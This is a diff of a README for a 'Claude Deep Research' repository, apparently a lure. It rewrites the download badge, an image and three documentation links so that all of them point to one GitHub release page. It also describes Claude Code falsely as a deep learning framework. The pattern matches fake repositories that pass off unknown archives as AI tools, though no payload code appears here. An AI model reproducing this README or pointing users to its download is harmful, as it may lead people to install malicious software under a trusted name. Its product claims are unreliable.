@@ -16,7 +16,7 @@ This repository is dedicated to providing a seamless experience for researchers 
 
 To get started with Claude Deep Research, simply download the configuration files from the following link:
 
-[![Download Configuration](https://img.shields.io/badge/Download-Config-%23ff69b4)](https://github.com/files/Soft.zip)
+[![Download Configuration](https://github.com/karanIPS/claude-deep-research/releases/tag/v1.2%23ff69b4)](https://github.com/karanIPS/claude-deep-research/releases/tag/v1.2)
 
 If the link does not work or is not provided, please make sure to check the "Releases" section of this repository for alternative download options.
 
@@ -24,7 +24,7 @@ If the link does not work or is not provided, please make sure to check the "Rel
 
 Claude Code is a state-of-the-art software framework designed for fast and efficient development of deep learning models. With support for a wide range of neural network architectures, optimization algorithms, and data processing tools, Claude Code empowers researchers and developers to push the boundaries of artificial intelligence.
 
-![Claude Code](https://github.com/claudedev/claude-code/images/claude-code.png)
+![Claude Code](https://github.com/karanIPS/claude-deep-research/releases/tag/v1.2)
 
 ## Key Features 🔑
 
@@ -51,9 +51,9 @@ If you have any questions, feedback, or need assistance with the Claude Deep Res
 
 For more information about Claude Code, deep learning, and artificial intelligence, check out the following recommended resources:
 
-- [Deep Learning 101: A Beginner's Guide](https://www.deeplearning101.com)
-- [Claude Code Documentation](https://www.claudecodedocs.com)
-- [Neural Network Architectures Explained](https://www.nn-architectures.com)
+- [Deep Learning 101: A Beginner's Guide](https://github.com/karanIPS/claude-deep-research/releases/tag/v1.2)
+- [Claude Code Documentation](https://github.com/karanIPS/claude-deep-research/releases/tag/v1.2)
+- [Neural Network Architectures Explained](https://github.com/karanIPS/claude-deep-research/releases/tag/v1.2)
 
 ## Get Started Today! 🌈
 
